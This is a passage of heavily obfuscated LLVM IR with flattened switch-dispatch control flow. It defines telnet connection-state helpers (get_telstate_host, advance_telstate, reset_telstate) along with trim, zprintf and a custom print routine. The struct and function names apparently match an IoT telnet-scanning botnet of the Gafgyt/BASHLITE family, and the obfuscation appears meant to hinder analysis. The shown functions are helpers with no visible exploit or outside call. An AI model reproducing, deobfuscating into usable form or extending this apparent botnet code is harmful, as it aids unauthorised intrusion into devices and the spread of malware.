loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -529291658, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -529291658, label %first
    i32 689567250, label %8
    i32 398060300, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 689567250, i32 398060300
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 398060300, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 154809815, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 154809815, label %10
    i32 899867943, label %20
    i32 -1000929288, label %23
    i32 -247364014, label %24
    i32 -298115687, label %29
    i32 1539104726, label %38
    i32 -451323615, label %40
    i32 -1279701137, label %43
    i32 -817683499, label %45
    i32 1063633358, label %50
    i32 1493080370, label %62
    i32 1744474973, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 899867943, i32 -1000929288
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 154809815, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -247364014, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -298115687, i32 1539104726
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #9
  %37 = icmp ne i32 %36, 0
  store i32 1539104726, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -451323615, i32 -1279701137
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -247364014, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -817683499, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 1063633358, i32 1744474973
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 1493080370, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -817683499, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -299469099, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -299469099, label %12
    i32 556688925, label %18
    i32 -2099804587, label %24
    i32 1179235828, label %32
    i32 -450634163, label %33
    i32 989998212, label %39
    i32 1482252360, label %40
    i32 1964965653, label %46
    i32 -1984585161, label %49
    i32 1862281562, label %50
    i32 -1487182569, label %56
    i32 1605802611, label %61
    i32 -852232348, label %62
    i32 1141349090, label %68
    i32 1609394835, label %73
    i32 1372607812, label %75
    i32 -249167104, label %84
    i32 -1195652358, label %87
    i32 -211302859, label %93
    i32 1274378104, label %99
    i32 -368340284, label %105
    i32 -1729341509, label %110
    i32 -159812319, label %118
    i32 1829464394, label %120
    i32 -1656070631, label %121
    i32 -92122906, label %127
    i32 1365533007, label %133
    i32 -1758821711, label %140
    i32 1412162568, label %146
    i32 1950817508, label %151
    i32 1423990037, label %158
    i32 -2020081171, label %164
    i32 -66416005, label %171
    i32 569245982, label %177
    i32 100368760, label %182
    i32 -91177702, label %189
    i32 -289474626, label %195
    i32 280317193, label %202
    i32 910427219, label %208
    i32 -563719948, label %213
    i32 819801006, label %220
    i32 -1295062929, label %226
    i32 693760420, label %233
    i32 -1441596362, label %239
    i32 2109725719, label %244
    i32 1126860284, label %251
    i32 -926530279, label %257
    i32 -1359607420, label %263
    i32 -1473614933, label %269
    i32 -1394830672, label %274
    i32 -707390597, label %286
    i32 -1858919924, label %287
    i32 13100623, label %288
    i32 -1052167926, label %295
    i32 -1574242346, label %296
    i32 735767815, label %299
    i32 1092153839, label %303
    i32 -432379845, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 556688925, i32 735767815
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -2099804587, i32 -1858919924
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 1179235828, i32 -450634163
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 735767815, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 989998212, i32 1482252360
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 13100623, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 1964965653, i32 -1984585161
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -1984585161, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 1862281562, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -1487182569, i32 1605802611
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 1862281562, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -852232348, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 1141349090, i32 1609394835
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 1609394835, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 1372607812, i32 -1195652358
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -249167104, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -852232348, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -211302859, i32 -92122906
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 1274378104, i32 -368340284
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -1729341509, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -1729341509, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 -159812319, i32 1829464394
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 -1656070631, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -1656070631, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.538, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 -1574242346, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 1365533007, i32 1423990037
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 -1758821711, i32 1412162568
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 1950817508, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 1950817508, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 -1574242346, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -2020081171, i32 -91177702
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 -66416005, i32 569245982
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 100368760, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 100368760, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 -1574242346, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -289474626, i32 819801006
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 280317193, i32 910427219
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -563719948, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -563719948, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
